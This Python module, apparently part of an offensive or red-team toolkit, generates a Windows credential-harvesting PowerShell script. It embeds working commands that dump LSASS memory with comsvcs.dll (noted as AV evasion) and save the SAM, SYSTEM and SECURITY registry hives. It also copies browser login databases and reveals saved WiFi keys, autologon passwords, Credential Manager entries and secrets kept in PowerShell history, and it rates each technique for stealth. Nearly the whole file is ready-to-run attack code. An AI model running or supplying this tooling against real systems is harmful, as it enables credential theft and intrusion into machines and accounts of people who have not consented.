#!/usr/bin/env python3
"""
Credential Harvesting Module
Multiple techniques for credential extraction
"""

from typing import Dict, List
from dataclasses import dataclass


@dataclass
class CredentialTechnique:
    """Represents a credential harvesting technique"""
    name: str
    description: str
    requires_admin: bool
    stealth_level: str  # 'low', 'medium', 'high'
    command: str
    post_processing: str = ""


class CredentialHarvester:
    """
    Systematic credential harvesting
    Multiple techniques for maximum coverage
    """
    
    def __init__(self):
        """Initialize credential harvester"""
        self.techniques = self._initialize_techniques()
    
    def _initialize_techniques(self) -> List[CredentialTechnique]:
        """Initialize credential harvesting techniques"""
        return [
            # LSASS Dump (Admin Required)
            CredentialTechnique(
                name="LSASS Memory Dump",
                description="Dump LSASS process memory for credential extraction",
                requires_admin=True,
                stealth_level="medium",
                command="""
# Check admin privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    # Use comsvcs.dll method (AV evasion)
    $process = Get-Process lsass
    $dumpFile = "$env:TEMP\\system_$(Get-Date -Format 'yyyyMMdd_HHmmss').dmp"
    
    # Create dump using Windows native DLL
    rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $process.Id $dumpFile full
    
    if (Test-Path $dumpFile) {
        Write-Host "[+] LSASS dump created: $dumpFile"
        Write-Host "[*] Process offline with Mimikatz/pypykatz"
    }
} else {
    Write-Host "[-] LSASS dump requires admin privileges"
}
""",
                post_processing="Process with: pypykatz lsa minidump <file> or mimikatz"
            ),
            
            # SAM/SYSTEM Registry Dump (Admin Required)
            CredentialTechnique(
                name="SAM/SYSTEM Registry Dump",
                description="Extract SAM and SYSTEM hives for offline cracking",
                requires_admin=True,
                stealth_level="low",
                command="""
if ($isAdmin) {
    $outputDir = "$env:TEMP\\regdump_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    
    # Save registry hives
    reg save HKLM\\SAM "$outputDir\\sam.save" /y
    reg save HKLM\\SYSTEM "$outputDir\\system.save" /y
    reg save HKLM\\SECURITY "$outputDir\\security.save" /y
    
    Write-Host "[+] Registry hives saved to: $outputDir"
    Write-Host "[*] Process with: secretsdump.py or samdump2"
} else {
    Write-Host "[-] Registry dump requires admin privileges"
}
""",
                post_processing="Process with: secretsdump.py -sam sam.save -system system.save LOCAL"
            ),
            
            # Browser Credentials
            CredentialTechnique(
                name="Browser Credential Extraction",
                description="Extract saved passwords from browsers",
                requires_admin=False,
                stealth_level="medium",
                command="""
$outputDir = "$env:TEMP\\browser_creds_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null

# Chrome
$chromePath = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"
if (Test-Path $chromePath) {
    Copy-Item $chromePath "$outputDir\\chrome_logins.db" -ErrorAction SilentlyContinue
    Write-Host "[+] Chrome credentials copied"
}

# Edge
$edgePath = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"
if (Test-Path $edgePath) {
    Copy-Item $edgePath "$outputDir\\edge_logins.db" -ErrorAction SilentlyContinue
    Write-Host "[+] Edge credentials copied"
}

# Firefox
$firefoxPath = "$env:APPDATA\\Mozilla\\Firefox\\Profiles"
if (Test-Path $firefoxPath) {
    Get-ChildItem $firefoxPath -Recurse -Include "logins.json","key4.db" -ErrorAction SilentlyContinue | 
    Copy-Item -Destination $outputDir -ErrorAction SilentlyContinue
    Write-Host "[+] Firefox credentials copied"
}

Write-Host "[*] Browser credentials saved to: $outputDir"
""",
                post_processing="Decrypt with browser credential tools"
            ),
            
            # Saved RDP Credentials
            CredentialTechnique(
                name="RDP Saved Credentials",
                description="List saved RDP connection credentials",
                requires_admin=False,
                stealth_level="low",
                command="""
Write-Host "[*] Checking for saved RDP credentials..."
$rdpCreds = cmdkey /list | Select-String "Target: TERMSRV"

if ($rdpCreds) {
    Write-Host "[+] Found saved RDP credentials:"
    $rdpCreds | ForEach-Object { Write-Host "    $_" }
} else {
    Write-Host "[-] No saved RDP credentials found"
}
"""
            ),
            
            # WiFi Passwords
            CredentialTechnique(
                name="WiFi Password Extraction",
                description="Extract saved WiFi passwords",
                requires_admin=False,
                stealth_level="low",
                command="""
Write-Host "[*] Extracting WiFi passwords..."

$profiles = (netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$_.Matches.Groups[1].Value.Trim()}

foreach ($profile in $profiles) {
    $password = (netsh wlan show profile name="$profile" key=clear) | Select-String 'Key Content\\W+\\:(.+)$'
    
    if ($password) {
        $pass = $password.Matches.Groups[1].Value.Trim()
        Write-Host "[+] $profile : $pass"
    }
}
"""
            ),
            
            # Credential Manager
            CredentialTechnique(
                name="Windows Credential Manager",
                description="Extract credentials from Windows Credential Manager",
                requires_admin=False,
                stealth_level="medium",
                command="""
Write-Host "[*] Dumping Windows Credential Manager..."

# List all stored credentials
cmdkey /list

# Extract using VaultCmd (if available)
vaultcmd /listcreds:"Windows Credentials" /all
vaultcmd /listcreds:"Web Credentials" /all
"""
            ),
            
            # Autologon Credentials
            CredentialTechnique(
                name="Autologon Credentials",
                description="Check for stored autologon credentials",
                requires_admin=False,
                stealth_level="low",
                command="""
Write-Host "[*] Checking for autologon credentials..."

$autologon = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' -ErrorAction SilentlyContinue

if ($autologon.DefaultUserName -or $autologon.DefaultPassword) {
    Write-Host "[+] Autologon credentials found:"
    Write-Host "    Username: $($autologon.DefaultUserName)"
    Write-Host "    Password: $($autologon.DefaultPassword)"
} else {
    Write-Host "[-] No autologon credentials found"
}
"""
            ),
            
            # Unattend Files
            CredentialTechnique(
                name="Unattend.xml Credentials",
                description="Search for credentials in unattend files",
                requires_admin=False,
                stealth_level="low",
                command="""
Write-Host "[*] Searching for unattend.xml files..."

$unattendPaths = @(
    "C:\\Windows\\Panther\\Unattend.xml",
    "C:\\Windows\\Panther\\Unattend\\Unattend.xml",
    "C:\\Windows\\System32\\sysprep\\unattend.xml",
    "C:\\Windows\\System32\\sysprep\\Panther\\unattend.xml"
)

foreach ($path in $unattendPaths) {
    if (Test-Path $path) {
        Write-Host "[+] Found: $path"
        $content = Get-Content $path
        
        # Search for passwords
        $passwords = $content | Select-String -Pattern 'password|cpassword' -Context 1,1
        if ($passwords) {
            Write-Host "[+] Potential credentials found in $path"
        }
    }
}
"""
            ),
            
            # IIS Application Pool Credentials
            CredentialTechnique(
                name="IIS App Pool Credentials",
                description="Extract IIS application pool credentials",
                requires_admin=True,
                stealth_level="medium",
                command="""
if ($isAdmin) {
    Write-Host "[*] Extracting IIS application pool credentials..."
    
    Import-Module WebAdministration -ErrorAction SilentlyContinue
    
    if (Get-Module WebAdministration) {
        Get-IISAppPool | ForEach-Object {
            $pool = $_
            Write-Host "[*] App Pool: $($pool.Name)"
            Write-Host "    Identity: $($pool.ProcessModel.IdentityType)"
            
            if ($pool.ProcessModel.IdentityType -eq "SpecificUser") {
                Write-Host "    Username: $($pool.ProcessModel.UserName)"
                # Password is encrypted, requires further processing
            }
        }
    }
}
"""
            ),
            
            # PowerShell History
            CredentialTechnique(
                name="PowerShell Command History",
                description="Search PowerShell history for credentials",
                requires_admin=False,
                stealth_level="low",
                command="""
Write-Host "[*] Searching PowerShell history for credentials..."

$historyPath = (Get-PSReadlineOption).HistorySavePath

if (Test-Path $historyPath) {
    $history = Get-Content $historyPath
    
    # Search for password-related commands
    $suspiciousCommands = $history | Select-String -Pattern 'password|credential|pwd|secret|key'
    
    if ($suspiciousCommands) {
        Write-Host "[+] Found potential credentials in PowerShell history:"
        $suspiciousCommands | ForEach-Object { Write-Host "    $_" }
    }
}

# Check all user histories
Get-ChildItem "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" -ErrorAction SilentlyContinue | 
ForEach-Object {
    Write-Host "[*] Checking: $($_.FullName)"
    $content = Get-Content $_.FullName | Select-String -Pattern 'password|credential|pwd|secret|key'
    if ($content) {
        Write-Host "[+] Found in $($_.FullName)"
    }
}
"""
            )
        ]
    
    def get_admin_techniques(self) -> List[CredentialTechnique]:
        """Get techniques requiring admin privileges"""
        return [t for t in self.techniques if t.requires_admin]
    
    def get_non_admin_techniques(self) -> List[CredentialTechnique]:
        """Get techniques not requiring admin privileges"""
        return [t for t in self.techniques if not t.requires_admin]
    
    def get_stealthy_techniques(self) -> List[CredentialTechnique]:
        """Get high-stealth techniques"""
        return [t for t in self.techniques if t.stealth_level == 'high']
    
    def get_all_techniques(self) -> List[CredentialTechnique]:
        """Get all credential harvesting techniques"""
        return self.techniques
    
    def generate_harvesting_script(self, admin_only: bool = False) -> str:
        """
        Generate credential harvesting PowerShell script
        
        Args:
            admin_only: Only include admin-required techniques
            
        Returns:
            PowerShell script for credential harvesting
        """
        if admin_only:
            techniques = self.get_admin_techniques()
        else:
            techniques = self.get_all_techniques()
        
        script = """# Credential Harvesting Script
# Multiple techniques for maximum coverage

# Check admin status
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Write-Host "[+] Running with administrator privileges"
} else {
    Write-Host "[*] Running with user privileges (some techniques unavailable)"
}

Write-Host "[*] Starting credential harvesting..."

"""
        
        for technique in techniques:
            script += f"""
# {technique.name}
Write-Host "`n[*] Technique: {technique.name}"
Write-Host "    {technique.description}"
Write-Host "    Requires Admin: {technique.requires_admin}"
Write-Host "    Stealth Level: {technique.stealth_level}"

{technique.command}

"""
            
            if technique.post_processing:
                script += f"""
# Post-processing note:
# {technique.post_processing}

"""
        
        script += """
Write-Host "`n[+] Credential harvesting complete"
"""
        
        return script
    
    def get_technique_summary(self) -> Dict:
        """Get summary of harvesting techniques"""
        return {
            'total_techniques': len(self.techniques),
            'admin_required': len(self.get_admin_techniques()),
            'non_admin': len(self.get_non_admin_techniques()),
            'stealth_levels': {
                'high': len([t for t in self.techniques if t.stealth_level == 'high']),
                'medium': len([t for t in self.techniques if t.stealth_level == 'medium']),
                'low': len([t for t in self.techniques if t.stealth_level == 'low'])
            }
        }
